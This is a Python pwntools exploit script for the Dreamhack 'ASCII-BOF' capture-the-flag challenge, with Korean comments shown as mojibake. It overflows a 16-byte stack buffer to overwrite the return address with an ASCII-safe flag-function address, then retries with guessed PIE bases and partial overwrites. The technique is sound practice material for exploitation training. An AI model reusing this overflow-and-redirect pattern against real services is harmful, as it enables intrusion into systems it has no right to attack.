#!/usr/bin/env python3

"""
ASCII-BOF ìµœì¢… ìµìŠ¤í”Œë¡œì‡ - ì„œë²„ í…ŒìŠ¤íŠ¸
"""

from pwn import *

def test_server_exploit():
    """ì„œë²„ì—ì„œ ìµœì¢… ìµìŠ¤í”Œë¡œì‡ í…ŒìŠ¤íŠ¸"""
    print("[+] ASCII-BOF ì„œë²„ ìµìŠ¤í”Œë¡œì‡ í…ŒìŠ¤íŠ¸")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # ìš°ë¦¬ê°€ ë¶„ì„í•œ ì •ë³´
    pie_base = 0x555555554000  # ì¶”ì • PIE ë² ì´ìŠ¤
    flag_func_offset = 0x1339  # í”Œë˜ê·¸ í•¨ìˆ˜ ì˜¤í”„ì…‹
    flag_func_addr = pie_base + flag_func_offset
    
    print(f"íƒ€ê²Ÿ: {HOST}:{PORT}")
    print(f"PIE ë² ì´ìŠ¤: 0x{pie_base:x}")
    print(f"í”Œë˜ê·¸ í•¨ìˆ˜: 0x{flag_func_addr:x}")
    
    # ASCII í˜¸í™˜ 6ë°”ì´íŠ¸ ì£¼ì†Œ
    addr_bytes = p64(flag_func_addr)[:6]
    print(f"6ë°”ì´íŠ¸ ì£¼ì†Œ: {addr_bytes.hex()}")
    
    # ASCII ì²´í¬
    for i, b in enumerate(addr_bytes):
        is_ascii = 0x20 < b < 0x7f
        char = chr(b) if is_ascii else '?'
        print(f"  ë°”ì´íŠ¸ {i}: 0x{b:02x} ({char}) - {'âœ…' if is_ascii else 'âŒ'}")
    
    # ìµœì¢… í˜ì´ë¡œë“œ
    payload = b"A" * 16        # 16ë°”ì´íŠ¸ ë²„í¼
    payload += b"B" * 8        # 8ë°”ì´íŠ¸ RBP
    payload += addr_bytes      # 6ë°”ì´íŠ¸ í”Œë˜ê·¸ í•¨ìˆ˜ ì£¼ì†Œ
    
    print(f"\ní˜ì´ë¡œë“œ ê¸¸ì´: {len(payload)}")
    print(f"í˜ì´ë¡œë“œ: {payload}")
    print(f"í˜ì´ë¡œë“œ (hex): {payload.hex()}")
    
    try:
        print("\n[+] ì„œë²„ ì—°ê²° ì¤‘...")
        r = remote(HOST, PORT)
        
        # Welcome ë©”ì‹œì§€ ìˆ˜ì‹ 
        welcome = r.recvline()
        print(f"ì„œë²„ ì‘ë‹µ: {welcome}")
        
        print("[+] í˜ì´ë¡œë“œ ì „ì†¡ ì¤‘...")
        r.send(payload + b'\n')
        
        print("[+] ì‘ë‹µ ëŒ€ê¸° ì¤‘...")
        response = r.recvall(timeout=5)
        print(f"ì„œë²„ ìµœì¢… ì‘ë‹µ: {response}")
        
        if b'DH{' in response:
            print("ğŸ‰ğŸ‰ğŸ‰ í”Œë˜ê·¸ ë°œê²¬!")
            flag_match = re.search(rb'DH\{[^}]+\}', response)
            if flag_match:
                flag = flag_match.group(0).decode()
                print(f"ğŸ† í”Œë˜ê·¸: {flag}")
                return flag
        elif b'You are hacker!' in response:
            print("âœ… ASCII ì²´í¬ í†µê³¼í–ˆì§€ë§Œ í”Œë˜ê·¸ ì—†ìŒ")
        else:
            print("â“ ì˜ˆìƒì¹˜ ëª»í•œ ì‘ë‹µ")
        
        r.close()
        
    except Exception as e:
        print(f"âŒ ì˜¤ë¥˜ ë°œìƒ: {e}")
    
    return None

def test_different_pie_bases():
    """ë‹¤ì–‘í•œ PIE ë² ì´ìŠ¤ë¡œ í…ŒìŠ¤íŠ¸"""
    print("\n[+] ë‹¤ì–‘í•œ PIE ë² ì´ìŠ¤ë¡œ í…ŒìŠ¤íŠ¸")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # ì¼ë°˜ì ì¸ PIE ë² ì´ìŠ¤ë“¤
    pie_bases = [
        0x555555554000,
        0x7ffff7dd0000,
        0x400000,
        0x564000000000,
        0x56400000,
    ]
    
    for pie_base in pie_bases:
        flag_func_addr = pie_base + 0x1339
        addr_bytes = p64(flag_func_addr)[:6]
        
        # ASCII í˜¸í™˜ì„± ì²´í¬
        if not all(0x20 < b < 0x7f for b in addr_bytes):
            print(f"PIE ë² ì´ìŠ¤ 0x{pie_base:x}: ASCII ë¹„í˜¸í™˜ - ê±´ë„ˆëœ€")
            continue
        
        print(f"\nPIE ë² ì´ìŠ¤ 0x{pie_base:x} í…ŒìŠ¤íŠ¸:")
        print(f"í”Œë˜ê·¸ í•¨ìˆ˜: 0x{flag_func_addr:x}")
        print(f"ì£¼ì†Œ ë°”ì´íŠ¸: {addr_bytes.hex()}")
        
        payload = b"A" * 16 + b"B" * 8 + addr_bytes
        
        try:
            r = remote(HOST, PORT)
            r.recvline()  # Welcome
            r.send(payload + b'\n')
            response = r.recvall(timeout=3)
            
            print(f"ì‘ë‹µ: {response}")
            
            if b'DH{' in response:
                print(f"ğŸ‰ ì„±ê³µ! PIE ë² ì´ìŠ¤: 0x{pie_base:x}")
                flag_match = re.search(rb'DH\{[^}]+\}', response)
                if flag_match:
                    return flag_match.group(0).decode()
            
            r.close()
            
        except Exception as e:
            print(f"ì˜¤ë¥˜: {e}")
    
    return None

def test_partial_overwrite():
    """ë¶€ë¶„ ì£¼ì†Œ ë®ì–´ì“°ê¸° í…ŒìŠ¤íŠ¸"""
    print("\n[+] ë¶€ë¶„ ì£¼ì†Œ ë®ì–´ì“°ê¸° í…ŒìŠ¤íŠ¸")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games' 
    PORT = 12458
    
    # 1-3ë°”ì´íŠ¸ ë¶€ë¶„ ë®ì–´ì“°ê¸° ì‹œë„
    test_bytes = [
        b'\x39',           # 1ë°”ì´íŠ¸
        b'\x39\x13',       # 2ë°”ì´íŠ¸  
        b'\x39\x13\x00',   # 3ë°”ì´íŠ¸ (NULL í¬í•¨)
        b'\x41',           # ë‹¤ë¥¸ 1ë°”ì´íŠ¸
        b'\x42',
        b'\x43',
    ]
    
    for addr_bytes in test_bytes:
        # ASCII ì²´í¬
        if not all(0x20 < b < 0x7f for b in addr_bytes):
            print(f"ì£¼ì†Œ {addr_bytes.hex()}: ASCII ë¹„í˜¸í™˜ - ê±´ë„ˆëœ€")
            continue
        
        payload = b"A" * 24 + addr_bytes  # 24ë°”ì´íŠ¸ + ë¶€ë¶„ ì£¼ì†Œ
        
        if len(payload) > 32:
            print(f"ì£¼ì†Œ {addr_bytes.hex()}: 32ë°”ì´íŠ¸ ì´ˆê³¼ - ê±´ë„ˆëœ€")
            continue
        
        print(f"\në¶€ë¶„ ì£¼ì†Œ {addr_bytes.hex()} í…ŒìŠ¤íŠ¸:")
        print(f"í˜ì´ë¡œë“œ ê¸¸ì´: {len(payload)}")
        
        try:
            r = remote(HOST, PORT)
            r.recvline()
            r.send(payload + b'\n')
            response = r.recvall(timeout=2)
            
            print(f"ì‘ë‹µ: {response}")
            
            if b'DH{' in response:
                print("ğŸ‰ ë¶€ë¶„ ë®ì–´ì“°ê¸° ì„±ê³µ!")
                flag_match = re.search(rb'DH\{[^}]+\}', response)
                if flag_match:
                    return flag_match.group(0).decode()
            
            r.close()
            
        except Exception as e:
            print(f"ì˜¤ë¥˜: {e}")
    
    return None

if __name__ == "__main__":
    import re
    
    print("ğŸš€ ASCII-BOF ì„œë²„ ìµœì¢… ìµìŠ¤í”Œë¡œì‡")
    print("=" * 60)
    
    # 1. ê¸°ë³¸ ìµìŠ¤í”Œë¡œì‡ ì‹œë„
    flag = test_server_exploit()
    
    if not flag:
        # 2. ë‹¤ì–‘í•œ PIE ë² ì´ìŠ¤ ì‹œë„
        flag = test_different_pie_bases()
    
    if not flag:
        # 3. ë¶€ë¶„ ë®ì–´ì“°ê¸° ì‹œë„
        flag = test_partial_overwrite()
    
    if flag:
        print(f"\nğŸ‰ğŸ‰ğŸ‰ ìµœì¢… ì„±ê³µ!")
        print(f"ğŸ† ASCII-BOF í”Œë˜ê·¸: {flag}")
    else:
        print("\nğŸ˜ ëª¨ë“  ì‹œë„ ì‹¤íŒ¨")
        print("ì¶”ê°€ ë¶„ì„ì´ í•„ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.")
